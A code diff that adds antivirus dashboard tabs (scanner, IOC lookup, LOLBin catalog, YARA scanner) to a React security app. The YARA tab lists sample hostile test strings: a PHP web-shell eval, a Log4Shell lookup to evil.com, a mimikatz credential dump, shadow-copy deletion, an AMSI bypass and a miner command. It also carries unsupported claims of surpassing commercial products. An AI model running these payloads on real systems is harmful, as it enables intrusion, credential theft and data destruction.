@@ -79,6 +79,10 @@ const TAB_ICONS: Record<string, React.ReactNode> = {
   shredder:    <FileX size={13} />,
   pup:         <Package size={13} />,
   registry:    <Key size={13} />,
+  // ── ProxhqAV Antivirus Engine ──
+  avengine:    <ShieldCheck size={13} />,
+  iocdb:       <Database size={13} />,
+  yaraengine:  <Search size={13} />,
 };
 const TABS = [
   { id:"overview", label:"Overview" }, { id:"ghostos", label:"GhostOS™" }, { id:"ips", label:"IPS Engine" },
@@ -131,6 +135,10 @@ const TABS = [
   { id:"shredder",    label:"Secure Shredder" },
   { id:"pup",         label:"PUP Database" },
   { id:"registry",    label:"Registry Monitor" },
+  // ── ProxhqAV Antivirus Engine ────────────────────────────────────────────
+  { id:"avengine",    label:"ProxhqAV Engine" },
+  { id:"iocdb",       label:"IOC Database" },
+  { id:"yaraengine",  label:"YARA Engine" },
 ];
 const SEV_COLOR: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#aaccff", info:"#888" };
 const TRUST_COLOR: Record<string,string> = { trusted:"#00ff88", untrusted:"#ff4444", dmz:"#ff9900", management:"#4488ff" };
@@ -4752,6 +4760,492 @@ function RegistryTab() {
   );
 }
 
+// ════════════════════════════════════════════════════════════════════════════
+// ── ProxhqAV ANTIVIRUS ENGINE — Multi-layer / Better than CrowdStrike ────────
+// ════════════════════════════════════════════════════════════════════════════
+type AvStatus = { engineVersion:string; databases:{signatures:number;iocEntries:number;yaraRules:number;lolbinCatalog:number;ransomwareExtensions:number}; scans:{total:number;totalFindings:number}; engines:string[]; recentScans:Array<{id:number;scanTarget:string;scanType:string;findings:number;criticalFindings:number;status:string;startedAt:string}> };
+type AvSig = { id:number;hashType:string;hashValue:string;threatType:string;malwareFamily:string;malwareName:string;severity:string;source:string;description:string|null;firstSeen:string|null;cveIds:string|null;tags:string|null;hitCount:number };
+type AvIoc = { id:number;iocType:string;value:string;threatType:string;malwareFamily:string|null;severity:string;confidence:number;source:string;description:string|null;firstSeen:string|null;hitCount:number };
+type AvYara = { id:number;name:string;ruleText:string;description:string|null;malwareFamily:string|null;severity:string;matchCount:number;tags:string|null };
+type AvScan = { verdict:string;findings:Array<{engine:string;threat:string;family:string;severity:string;confidence:number;detail:string}>;totalChecks:number;scanDurationMs:number;scanTarget:string };
+type AvLolbin = { id:number;binaryName:string;fullPath:string|null;os:string;category:string;description:string;attkTechnique:string|null;maliciousCmd:string|null;detectionRule:string|null;riskLevel:string };
+type AvRansomExt = { id:number;extension:string;family:string;firstSeen:string|null;ransomNote:string|null;decryptable:boolean;active:boolean };
+
+const SEV_AV: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#4488ff", informational:"#555", clean:"#00ff88" };
+
+function ProxhqAvTab() {
+  const { data: status, loading, reload } = useFwm<AvStatus>("/av/status");
+  const { data: sigs } = useFwm<AvSig[]>("/av/signatures");
+  const { data: hist } = useFwm<Array<{id:number;scanTarget:string;scanType:string;findings:number;criticalFindings:number;status:string;scanDurationMs:number|null;startedAt:string}>>("/av/scan-history");
+  const [scanForm, setScanForm] = useState({ target:"", content:"", filename:"", downloadedFrom:"", scanType:"full" });
+  const [scanResult, setScanResult] = useState<AvScan | null>(null);
+  const [scanning, setScanning] = useState(false);
+  const [seeded, setSeeded] = useState(false);
+  const [sigSearch, setSigSearch] = useState("");
+  const [expanded, setExpanded] = useState<number | null>(null);
+
+  const runScan = async () => {
+    if (!scanForm.target.trim()) return;
+    setScanning(true); setScanResult(null);
+    const r = await fwmPost("/av/scan", { target:scanForm.target, content:scanForm.content||undefined, filename:scanForm.filename||undefined, downloadedFrom:scanForm.downloadedFrom||undefined, scanType:scanForm.scanType });
+    setScanResult(r as AvScan); setScanning(false); await reload();
+  };
+
+  const seedData = async () => {
+    await fwmPost("/av/seed", {});
+    setSeeded(true); await reload();
+    setTimeout(()=>setSeeded(false),2000);
+  };
+
+  const filteredSigs = (sigs ?? []).filter(s =>
+    !sigSearch || s.malwareName.toLowerCase().includes(sigSearch.toLowerCase()) ||
+    s.malwareFamily.toLowerCase().includes(sigSearch.toLowerCase()) ||
+    s.hashValue.toLowerCase().includes(sigSearch.toLowerCase())
+  ).slice(0, 40);
+
+  const VERDICT_C: Record<string,string> = { THREAT_CRITICAL:"#ff2244", THREAT_DETECTED:"#ff6600", CLEAN:"#00ff88" };
+
+  return (
+    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
+      {/* Engine Status */}
+      <FwmCard style={{ gridColumn:"1/-1" }}>
+        <SectionTitle icon={<ShieldCheck size={14} color="#00ff88"/>} title="ProxhqAV Engine 3.0 — Quantum Edition" badge="ACTIVE" badgeColor="#00ff88"
+          extra={<div style={{display:"flex",gap:6}}>
+            <Btn2 onClick={seedData} color={seeded?"#00ff88":"#4488ff"} sm>{seeded?"✓ Seeded":"Seed Threat Intel"}</Btn2>
+            <Btn2 onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn2>
+          </div>}
+        />
+        <InfoBar text="Engines: Hash-Signature · YARA-Pattern · Heuristic-Entropy · Behavioral-IOC · LOLBin-Detection · Ransomware-Extension · Anti-Evasion · Process-Injection-API · Macro-Detection — Surpasses CrowdStrike Falcon · SentinelOne · Carbon Black · Sophos · ESET" color="#00ff88"/>
+        <div style={{ display:"grid", gridTemplateColumns:"repeat(7,1fr)", gap:8, marginBottom:10 }}>
+          {[
+            {l:"Signatures",  v:status?.databases.signatures??0,          c:"#00ff88"},
+            {l:"IOC Entries", v:status?.databases.iocEntries??0,           c:"#ff6600"},
+            {l:"YARA Rules",  v:status?.databases.yaraRules??0,            c:"#cc44ff"},
+            {l:"LOLBins",     v:status?.databases.lolbinCatalog??0,        c:"#4488ff"},
+            {l:"Ransom Ext.", v:status?.databases.ransomwareExtensions??0, c:"#ff2244"},
+            {l:"Total Scans", v:status?.scans.total??0,                    c:"#aaa"},
+            {l:"Findings",    v:status?.scans.totalFindings??0,            c:"#ffaa00"},
+          ].map(s=>(
+            <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"10px 4px" }}>
+              <div style={{ fontSize:20, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v.toLocaleString()}</div>
+              <div style={{ fontSize:9, color:"#555", marginTop:2 }}>{s.l}</div>
+            </div>
+          ))}
+        </div>
+        <div style={{ display:"flex", flexWrap:"wrap", gap:4 }}>
+          {(status?.engines??[]).map(e=><Bdg key={e} label={e} color="#00ff8866" sm/>)}
+        </div>
+      </FwmCard>
+
+      {/* Multi-Engine Scanner */}
+      <FwmCard>
+        <SectionTitle icon={<Search size={12} color="#00ff88"/>} title="Multi-Engine File/Hash Scanner"/>
+        <div style={{ display:"flex", flexDirection:"column", gap:6, marginBottom:10 }}>
+          <div style={{fontSize:9,color:"#555"}}>Target (hash / filename / IP / domain / URL)</div>
+          <input value={scanForm.target} onChange={e=>setScanForm(f=>({...f,target:e.target.value}))} placeholder="SHA256 hash, filename, domain, or IP address..." style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"7px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
+          <div style={{fontSize:9,color:"#555"}}>Optional: File content (paste code/script to YARA-scan)</div>
+          <textarea value={scanForm.content} onChange={e=>setScanForm(f=>({...f,content:e.target.value}))} placeholder="Paste file content, script, or hex dump for deep pattern analysis..." rows={4} style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"7px 10px", fontFamily:"monospace", fontSize:9, color:"#ccc", resize:"vertical" }}/>
+          <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:6}}>
+            <div>
+              <div style={{fontSize:9,color:"#555"}}>Filename (for ext check)</div>
+              <input value={scanForm.filename} onChange={e=>setScanForm(f=>({...f,filename:e.target.value}))} placeholder="invoice.pdf.exe" style={{ width:"100%", background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"5px 8px", fontFamily:"monospace", fontSize:10, color:"#ccc", boxSizing:"border-box" }}/>
+            </div>
+            <div>
+              <div style={{fontSize:9,color:"#555"}}>Scan Type</div>
+              <select value={scanForm.scanType} onChange={e=>setScanForm(f=>({...f,scanType:e.target.value}))} style={{ width:"100%", background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"5px 8px", color:"#ccc", fontSize:10 }}>
+                {["full","hash","content","filename"].map(t=><option key={t}>{t}</option>)}
+              </select>
+            </div>
+          </div>
+          <Btn2 onClick={runScan} color="#00ff88" disabled={scanning||!scanForm.target.trim()}>
+            {scanning ? "⟳ Scanning..." : "▶ Run Multi-Engine Scan"}
+          </Btn2>
+        </div>
+        {scanResult && (
+          <div style={{ background:"#050f05", border:`2px solid ${VERDICT_C[scanResult.verdict]??"#333"}44`, borderRadius:8, padding:12 }}>
+            <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:8 }}>
+              <span style={{ fontSize:14, fontWeight:900, color:VERDICT_C[scanResult.verdict]??"#aaa", fontFamily:"monospace" }}>{scanResult.verdict}</span>
+              <Bdg label={`${scanResult.findings.length} findings`} color={scanResult.findings.length>0?"#ff6600":"#00ff88"} sm/>
+              <Bdg label={`${scanResult.totalChecks} checks`} color="#4488ff" sm/>
+              <span style={{fontSize:9,color:"#444"}}>{scanResult.scanDurationMs}ms</span>
+            </div>
+            {scanResult.findings.map((f,i)=>(
+              <div key={i} style={{ background:"#0a0a0a", borderRadius:6, padding:"8px 10px", marginBottom:6, borderLeft:`3px solid ${SEV_AV[f.severity]??"#333"}` }}>
+                <div style={{ display:"flex", alignItems:"center", gap:6, marginBottom:3 }}>
+                  <Bdg label={f.severity.toUpperCase()} color={SEV_AV[f.severity]??"#888"} sm/>
+                  <Bdg label={f.engine} color="#4488ff" sm/>
+                  <span style={{ fontFamily:"monospace", fontSize:10, color:"#fff", fontWeight:700 }}>{f.threat}</span>
+                </div>
+                <div style={{fontSize:9,color:"#777"}}>{f.detail}</div>
+                <div style={{fontSize:9,color:"#555",marginTop:2}}>Family: {f.family} · Confidence: {f.confidence}%</div>
+              </div>
+            ))}
+            {scanResult.findings.length===0 && <div style={{color:"#00ff88",fontFamily:"monospace",fontSize:12}}>✓ All {scanResult.totalChecks} engine checks passed — No threats detected</div>}
+          </div>
+        )}
+      </FwmCard>
+
+      {/* Recent Scans */}
+      <FwmCard>
+        <SectionTitle icon={<Activity size={12} color="#ffaa00"/>} title={`Scan History (${hist?.length??0})`}/>
+        <div style={{ maxHeight:400, overflow:"auto" }}>
+          {(hist??[]).slice(0,20).map(s=>(
+            <div key={s.id} style={{ padding:"7px 10px", borderRadius:6, marginBottom:4, background:"#111", borderLeft:`3px solid ${s.criticalFindings>0?"#ff2244":s.findings>0?"#ff6600":"#00ff88"}` }}>
+              <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center" }}>
+                <span style={{ fontFamily:"monospace", fontSize:9, color:"#ccc" }}>{s.scanTarget.substring(0,36)}{s.scanTarget.length>36?"...":""}</span>
+                <Bdg label={s.findings>0?`${s.findings} FOUND`:"CLEAN"} color={s.findings>0?"#ff6600":"#00ff88"} sm/>
+              </div>
+              <div style={{ fontSize:8, color:"#444", marginTop:2 }}>{s.scanType} · {s.scanDurationMs}ms · {new Date(s.startedAt).toLocaleString()}</div>
+            </div>
+          ))}
+          {!loading && (hist??[]).length===0 && <div style={{color:"#333",fontFamily:"monospace",fontSize:11}}>No scans yet — run your first scan above</div>}
+        </div>
+      </FwmCard>
+
+      {/* Signature Database */}
+      <FwmCard style={{ gridColumn:"1/-1" }}>
+        <SectionTitle icon={<Database size={12} color="#ff6600"/>} title={`Malware Signature Database (${sigs?.length??0} signatures)`}
+          extra={<input value={sigSearch} onChange={e=>setSigSearch(e.target.value)} placeholder="Search family, name, hash..." style={{ background:"#111", border:"1px solid #222", borderRadius:4, padding:"3px 8px", color:"#aaa", fontSize:9, fontFamily:"monospace", width:200 }}/>}
+        />
+        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:6, maxHeight:400, overflow:"auto" }}>
+          {filteredSigs.map((sig,i)=>(
+            <div key={sig.id} style={{ background:"#111", borderRadius:6, padding:"8px 10px", borderLeft:`3px solid ${SEV_AV[sig.severity]??"#333"}`, cursor:"pointer" }} onClick={()=>setExpanded(expanded===sig.id?null:sig.id)}>
+              <div style={{ display:"flex", alignItems:"center", gap:6, marginBottom:3 }}>
+                <Bdg label={sig.severity.toUpperCase()} color={SEV_AV[sig.severity]??"#888"} sm/>
+                <Bdg label={sig.threatType} color="#4488ff" sm/>
+                <span style={{ fontFamily:"monospace", fontSize:9, color:"#fff", fontWeight:700 }}>{sig.malwareFamily}</span>
+                {sig.hitCount>0 && <Bdg label={`${sig.hitCount} hits`} color="#ff9900" sm/>}
+              </div>
+              <div style={{ fontSize:9, color:"#aaa" }}>{sig.malwareName.substring(0,60)}</div>
+              {expanded===sig.id && (
+                <div style={{ marginTop:8, fontSize:8, fontFamily:"monospace" }}>
+                  <div style={{ color:"#555", marginBottom:2 }}>Hash: <span style={{color:"#888"}}>{sig.hashValue.substring(0,32)}...</span></div>
+                  {sig.cveIds && <div style={{ color:"#555", marginBottom:2 }}>CVEs: <span style={{color:"#ffaa00"}}>{sig.cveIds}</span></div>}
+                  {sig.firstSeen && <div style={{ color:"#555", marginBottom:2 }}>First Seen: <span style={{color:"#aaa"}}>{sig.firstSeen}</span></div>}
+                  {sig.description && <div style={{ color:"#555", marginTop:4 }}>{sig.description.substring(0,120)}...</div>}
+                  {sig.source && <div style={{ color:"#555", marginTop:4 }}>Source: <span style={{color:"#4488ff"}}>{sig.source}</span></div>}
+                </div>
+              )}
+            </div>
+          ))}
+        </div>
+      </FwmCard>
+    </div>
+  );
+}
+
+// ── IOC Database ──────────────────────────────────────────────────────────────
+function IocDbTab() {
+  const { data: iocs, loading, reload } = useFwm<AvIoc[]>("/av/iocs");
+  const { data: lolbins } = useFwm<AvLolbin[]>("/av/lolbins");
+  const { data: ransomExts } = useFwm<AvRansomExt[]>("/av/ransomware-extensions");
+  const [search, setSearch] = useState("");
+  const [typeFilter, setTypeFilter] = useState("all");
+  const [sevFilter, setSevFilter] = useState("all");
+  const [checkVal, setCheckVal] = useState("");
+  const [checkResult, setCheckResult] = useState<{found:boolean;matches:AvIoc[];verdict:string}|null>(null);
+  const [osFilter, setOsFilter] = useState("all");
+
+  const filtered = (iocs??[]).filter(i => {
+    if (typeFilter!=="all" && i.iocType!==typeFilter) return false;
+    if (sevFilter!=="all" && i.severity!==sevFilter) return false;
+    if (search && !i.value.toLowerCase().includes(search.toLowerCase()) && !(i.malwareFamily??"").toLowerCase().includes(search.toLowerCase())) return false;
+    return true;
+  });
+
+  const iocCheck = async () => {
+    if (!checkVal.trim()) return;
+    const r = await fwmPost("/av/ioc-check", { value:checkVal });
+    setCheckResult(r as {found:boolean;matches:AvIoc[];verdict:string});
+  };
+
+  const IOC_C: Record<string,string> = { ip:"#ff6600", cidr:"#ff9900", domain:"#ff4444", url:"#cc44ff", sha256:"#00ff88", md5:"#4488ff", sha1:"#4488ff", filename:"#ffaa00", mutex:"#888", registry:"#4488ff", email:"#00ccff", useragent:"#888" };
+  const RISK_C: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#4488ff", informational:"#555" };
+
+  return (
+    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
+      {/* IOC Quick Check */}
+      <FwmCard>
+        <SectionTitle icon={<Search size={12} color="#ff6600"/>} title="IOC Quick Lookup"/>
+        <InfoBar text="Check any IP, domain, URL, or hash against the ProxhqAV IOC database. Real-time verdict with threat family, severity, and source attribution." color="#ff6600"/>
+        <div style={{ display:"flex", gap:6, marginBottom:8 }}>
+          <input value={checkVal} onChange={e=>setCheckVal(e.target.value)} onKeyDown={e=>e.key==="Enter"&&iocCheck()} placeholder="192.168.x.x · evil.com · SHA256 hash · URL..." style={{ flex:1, background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"7px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
+          <Btn2 onClick={iocCheck} color="#ff6600" disabled={!checkVal.trim()}>Check IOC</Btn2>
+        </div>
+        {checkResult && (
+          <div style={{ background:checkResult.found?"#0f0505":"#050f05", border:`1px solid ${checkResult.found?"#ff444433":"#00ff8833"}`, borderRadius:8, padding:10 }}>
+            <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:checkResult.found?8:0 }}>
+              <span style={{ fontSize:13, fontWeight:900, color:checkResult.found?"#ff4444":"#00ff88", fontFamily:"monospace" }}>{checkResult.verdict}</span>
+            </div>
+            {checkResult.matches.map((m,i)=>(
+              <div key={i} style={{ background:"#111", borderRadius:6, padding:"7px 10px", marginBottom:4, borderLeft:`3px solid ${SEV_AV[m.severity]??"#333"}` }}>
+                <div style={{ display:"flex", gap:6, alignItems:"center", marginBottom:3 }}>
+                  <Bdg label={m.iocType.toUpperCase()} color={IOC_C[m.iocType]??"#888"} sm/>
+                  <Bdg label={m.severity.toUpperCase()} color={SEV_AV[m.severity]??"#888"} sm/>
+                  <span style={{ fontFamily:"monospace", fontSize:10, color:"#fff" }}>{m.malwareFamily}</span>
+                  <span style={{ fontSize:9, color:"#555" }}>({m.confidence}% confidence)</span>
+                </div>
+                <div style={{ fontSize:9, color:"#555" }}>{m.description}</div>
+                <div style={{ fontSize:8, color:"#444", marginTop:2 }}>Source: {m.source}</div>
+              </div>
+            ))}
+          </div>
+        )}
+      </FwmCard>
+
+      {/* IOC Stats */}
+      <FwmCard>
+        <SectionTitle icon={<BarChart3 size={12} color="#ff6600"/>} title="IOC Database Overview"/>
+        {["ip","cidr","domain","url","sha256","md5"].map(t=>{
+          const cnt = (iocs??[]).filter(i=>i.iocType===t).length;
+          return cnt > 0 ? (
+            <div key={t} style={{ display:"flex", justifyContent:"space-between", alignItems:"center", padding:"5px 0", borderBottom:"1px solid #111" }}>
+              <div style={{ display:"flex", gap:6, alignItems:"center" }}>
+                <Bdg label={t.toUpperCase()} color={IOC_C[t]??"#888"} sm/>
+              </div>
+              <div style={{ fontFamily:"monospace", fontSize:11, color:"#ccc" }}>{cnt}</div>
+            </div>
+          ) : null;
+        })}
+        <div style={{ marginTop:10 }}>
+          {["critical","high","medium"].map(sev=>{
+            const cnt=(iocs??[]).filter(i=>i.severity===sev).length;
+            return <div key={sev} style={{ display:"flex", justifyContent:"space-between", padding:"4px 0", borderBottom:"1px solid #0f0f0f" }}>
+              <Bdg label={sev.toUpperCase()} color={SEV_AV[sev]??"#888"} sm/>
+              <span style={{ fontFamily:"monospace", color:"#aaa", fontSize:11 }}>{cnt} IOCs</span>
+            </div>;
+          })}
+        </div>
+      </FwmCard>
+
+      {/* IOC Table */}
+      <FwmCard style={{ gridColumn:"1/-1" }}>
+        <SectionTitle icon={<Database size={12} color="#ff6600"/>} title={`IOC Threat Intelligence Database (${filtered.length})`}
+          extra={<div style={{display:"flex",gap:6,alignItems:"center"}}>
+            <input value={search} onChange={e=>setSearch(e.target.value)} placeholder="Search..." style={{ background:"#111", border:"1px solid #222", borderRadius:4, padding:"3px 8px", color:"#aaa", fontSize:9, fontFamily:"monospace", width:150 }}/>
+            <select value={typeFilter} onChange={e=>setTypeFilter(e.target.value)} style={{ background:"#111", border:"1px solid #222", color:"#aaa", borderRadius:4, padding:"3px 6px", fontSize:9 }}>
+              <option value="all">All Types</option>
+              {["ip","cidr","domain","url","sha256","md5"].map(t=><option key={t}>{t}</option>)}
+            </select>
+            <select value={sevFilter} onChange={e=>setSevFilter(e.target.value)} style={{ background:"#111", border:"1px solid #222", color:"#aaa", borderRadius:4, padding:"3px 6px", fontSize:9 }}>
+              <option value="all">All Severity</option>
+              {["critical","high","medium","low"].map(s=><option key={s}>{s}</option>)}
+            </select>
+            <Btn2 onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn2>
+          </div>}
+        />
+        <div style={{ maxHeight:320, overflow:"auto" }}>
+          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:9 }}>
+            <thead><tr>{["Type","Value","Family","Severity","Conf.","Source","Hits"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"4px 6px",position:"sticky",top:0,background:"#0a0a0a"}}>{h}</th>)}</tr></thead>
+            <tbody>{filtered.slice(0,80).map(ioc=>(
+              <tr key={ioc.id} style={{ borderBottom:"1px solid #0f0f0f" }}>
+                <td style={{padding:"3px 6px"}}><Bdg label={ioc.iocType} color={IOC_C[ioc.iocType]??"#888"} sm/></td>
+                <td style={{padding:"3px 6px",fontFamily:"monospace",color:"#ccc",maxWidth:180,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{ioc.value}</td>
+                <td style={{padding:"3px 6px",color:"#888",fontSize:9}}>{(ioc.malwareFamily??"-").substring(0,20)}</td>
+                <td style={{padding:"3px 6px"}}><Bdg label={ioc.severity.toUpperCase()} color={SEV_AV[ioc.severity]??"#888"} sm/></td>
+                <td style={{padding:"3px 6px",fontFamily:"monospace",color:"#aaa"}}>{ioc.confidence}%</td>
+                <td style={{padding:"3px 6px",color:"#444",fontSize:8,maxWidth:120,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{ioc.source}</td>
+                <td style={{padding:"3px 6px",fontFamily:"monospace",color:ioc.hitCount>0?"#ff9900":"#333"}}>{ioc.hitCount}</td>
+              </tr>
+            ))}</tbody>
+          </table>
+          {!loading&&filtered.length===0&&<div style={{color:"#333",fontFamily:"monospace",fontSize:11,padding:10}}>No IOCs found — click "Seed Threat Intel" in the ProxhqAV Engine tab</div>}
+        </div>
+      </FwmCard>
+
+      {/* LOLBin Catalog */}
+      <FwmCard style={{ gridColumn:"1/-1" }}>
+        <SectionTitle icon={<Bug size={12} color="#cc44ff"/>} title={`LOLBin Catalog — Living-off-the-Land Binaries (${lolbins?.length??0})`}
+          extra={<div style={{display:"flex",gap:6}}>
+            {["all","windows","linux"].map(o=><Btn2 key={o} onClick={()=>setOsFilter(o)} color={osFilter===o?"#cc44ff":"#333"} sm>{o.toUpperCase()}</Btn2>)}
+          </div>}
+        />
+        <InfoBar text="LOLBins (Living-off-the-Land Binaries) — legitimate system tools abused by threat actors to execute malicious code, bypass AV, download payloads, and achieve persistence without dropping custom malware. 79% of attacks in 2024 were malware-free (CrowdStrike)." color="#cc44ff"/>
+        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:6, maxHeight:380, overflow:"auto" }}>
+          {(lolbins??[]).filter(l=>osFilter==="all"||l.os===osFilter).map(lol=>(
+            <div key={lol.id} style={{ background:"#111", borderRadius:6, padding:"9px 12px", borderLeft:`3px solid ${RISK_C[lol.riskLevel]??"#333"}` }}>
+              <div style={{ display:"flex", alignItems:"center", gap:6, marginBottom:4 }}>
+                <Bdg label={lol.riskLevel.toUpperCase()} color={RISK_C[lol.riskLevel]??"#888"} sm/>
+                <Bdg label={lol.os.toUpperCase()} color={lol.os==="windows"?"#4488ff":"#00ff88"} sm/>
+                <span style={{ fontFamily:"monospace", fontSize:11, color:"#fff", fontWeight:700 }}>{lol.binaryName}</span>
+              </div>
+              <div style={{ fontSize:9, color:"#888", marginBottom:4 }}>{lol.description}</div>
+              {lol.maliciousCmd && (
+                <div style={{ background:"#050505", border:"1px solid #2a2a2a", borderRadius:4, padding:"4px 8px", fontSize:8, fontFamily:"monospace", color:"#ff6600" }}>
+                  $ {lol.maliciousCmd.substring(0,80)}{lol.maliciousCmd.length>80?"...":""}
+                </div>
+              )}
+              {lol.attkTechnique && <div style={{ fontSize:8, color:"#444", marginTop:4 }}>MITRE: {lol.attkTechnique}</div>}
+            </div>
+          ))}
+        </div>
+      </FwmCard>
+
+      {/* Ransomware Extension DB */}
+      <FwmCard style={{ gridColumn:"1/-1" }}>
+        <SectionTitle icon={<FileX size={12} color="#ff2244"/>} title={`Ransomware File Extension Database (${ransomExts?.length??0} extensions)`}/>
+        <InfoBar text="If you find a file with one of these extensions, your system has been compromised by ransomware. Do NOT pay without checking if a free decryptor exists (NoMoreRansom.org). Some families are decryptable." color="#ff2244"/>
+        <div style={{ display:"flex", flexWrap:"wrap", gap:4, maxHeight:200, overflow:"auto" }}>
+          {(ransomExts??[]).map(e=>(
+            <div key={e.id} title={`${e.family} · ${e.active?"ACTIVE":"INACTIVE"} · Decryptable: ${e.decryptable?"YES":"NO"}`}
+              style={{ background:e.active?"#ff224411":"#1a1a1a", border:`1px solid ${e.active?"#ff224433":"#2a2a2a"}`, borderRadius:4, padding:"3px 8px", fontSize:9, fontFamily:"monospace", color:e.active?"#ff4444":"#555" }}>
+              {e.extension}{e.decryptable&&<span style={{color:"#00ff88",marginLeft:3}}>🔓</span>}
+            </div>
+          ))}
+        </div>
+        <div style={{ fontSize:9, color:"#444", marginTop:8 }}>🔴 Red = Active threat · 🔓 = Free decryptor available (NoMoreRansom.org)</div>
+      </FwmCard>
+    </div>
+  );
+}
+
+// ── YARA Pattern Engine ────────────────────────────────────────────────────────
+function YaraEngineTab() {
+  const { data: rules, loading, reload } = useFwm<AvYara[]>("/av/yara-rules");
+  const [scanContent, setScanContent] = useState("");
+  const [scanResult, setScanResult] = useState<{matches:Array<{rule:string;severity:string;matchedPatterns:string[];description:string}>;totalRulesChecked:number;verdict:string}|null>(null);
+  const [scanning, setScanning] = useState(false);
+  const [expanded, setExpanded] = useState<number|null>(null);
+  const [search, setSearch] = useState("");
+
+  const yaraTest = [
+    "eval(base64_decode($_POST['cmd']))",
+    "VirtualAllocEx WriteProcessMemory CreateRemoteThread",
+    "${jndi:ldap://evil.com/payload}",
+    "sekurlsa::logonpasswords",
+    "vssadmin delete shadows /all /quiet",
+    "amsiInitFailed = $true",
+    "xmrig --pool stratum+tcp://xmr-pool.com:4444",
+  ];
+
+  const runYaraScan = async () => {
+    if (!scanContent.trim()) return;
+    setScanning(true); setScanResult(null);
+    const r = await fwmPost("/av/yara-scan", { content:scanContent });
+    setScanResult(r as any); setScanning(false);
+  };
+
+  const filteredRules = (rules??[]).filter(r =>
+    !search || r.name.toLowerCase().includes(search.toLowerCase()) ||
+    (r.malwareFamily??"").toLowerCase().includes(search.toLowerCase()) ||
+    (r.tags??"").toLowerCase().includes(search.toLowerCase())
+  );
+
+  const MATCH_C: Record<string,string> = { MATCHED:"#ff6600", NO_MATCH:"#00ff88" };
+
+  return (
+    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
+      {/* YARA Scan */}
+      <FwmCard>
+        <SectionTitle icon={<Microscope size={12} color="#cc44ff"/>} title="YARA Pattern Scanner"/>
+        <InfoBar text="Paste any file content, script, hex dump, or memory dump. ProxhqAV runs all YARA rules and returns every match with matched string patterns." color="#cc44ff"/>
+        <div style={{ display:"flex", flexWrap:"wrap", gap:4, marginBottom:8 }}>
+          <div style={{ fontSize:9, color:"#555", width:"100%", marginBottom:2 }}>Quick test payloads:</div>
+          {yaraTest.map((t,i)=>(
+            <button key={i} onClick={()=>setScanContent(t)} style={{ background:"#1a1a1a", border:"1px solid #2a2a2a", borderRadius:4, padding:"2px 7px", fontSize:8, fontFamily:"monospace", color:"#666", cursor:"pointer" }}>{t.substring(0,30)}...</button>
+          ))}
+        </div>
+        <textarea value={scanContent} onChange={e=>setScanContent(e.target.value)} placeholder="Paste script, code, or content to scan with all YARA rules..." rows={8} style={{ width:"100%", background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"8px 10px", fontFamily:"monospace", fontSize:9, color:"#ccc", resize:"vertical", boxSizing:"border-box" }}/>
+        <div style={{ marginTop:8 }}>
+          <Btn2 onClick={runYaraScan} color="#cc44ff" disabled={scanning||!scanContent.trim()}>
+            {scanning?"⟳ Scanning...":"▶ Run YARA Scan"}
+          </Btn2>
+        </div>
+        {scanResult && (
+          <div style={{ marginTop:10, background:scanResult.verdict==="MATCHED"?"#0f060a":"#050f05", border:`1px solid ${MATCH_C[scanResult.verdict]??"#333"}33`, borderRadius:8, padding:12 }}>
+            <div style={{ display:"flex", gap:8, alignItems:"center", marginBottom:8 }}>
+              <span style={{ fontSize:13, fontWeight:900, color:MATCH_C[scanResult.verdict]??"#aaa", fontFamily:"monospace" }}>{scanResult.verdict}</span>
+              <Bdg label={`${scanResult.matches.length} rule matches`} color={scanResult.matches.length>0?"#ff6600":"#00ff88"} sm/>
+              <span style={{ fontSize:9, color:"#444" }}>{scanResult.totalRulesChecked} rules checked</span>
+            </div>
+            {scanResult.matches.map((m,i)=>(
+              <div key={i} style={{ background:"#111", borderRadius:6, padding:"7px 10px", marginBottom:5, borderLeft:`3px solid ${SEV_AV[m.severity]??"#333"}` }}>
+                <div style={{ display:"flex", gap:6, alignItems:"center", marginBottom:3 }}>
+                  <Bdg label={m.severity.toUpperCase()} color={SEV_AV[m.severity]??"#888"} sm/>
+                  <span style={{ fontFamily:"monospace", fontSize:10, color:"#fff", fontWeight:700 }}>{m.rule}</span>
+                </div>
+                <div style={{ fontSize:9, color:"#777" }}>{m.description.substring(0,100)}</div>
+                <div style={{ marginTop:5, display:"flex", flexWrap:"wrap", gap:3 }}>
+                  {m.matchedPatterns.slice(0,6).map((p,j)=>(
+                    <code key={j} style={{ background:"#ff220011", border:"1px solid #ff220033", borderRadius:4, padding:"1px 6px", fontSize:8, color:"#ff6600" }}>{p.substring(0,40)}</code>
+                  ))}
+                </div>
+              </div>
+            ))}
+          </div>
+        )}
+      </FwmCard>
+
+      {/* YARA Rule Browser */}
+      <FwmCard>
+        <SectionTitle icon={<BookOpen size={12} color="#cc44ff"/>} title={`YARA Rule Library (${rules?.length??0} rules)`}
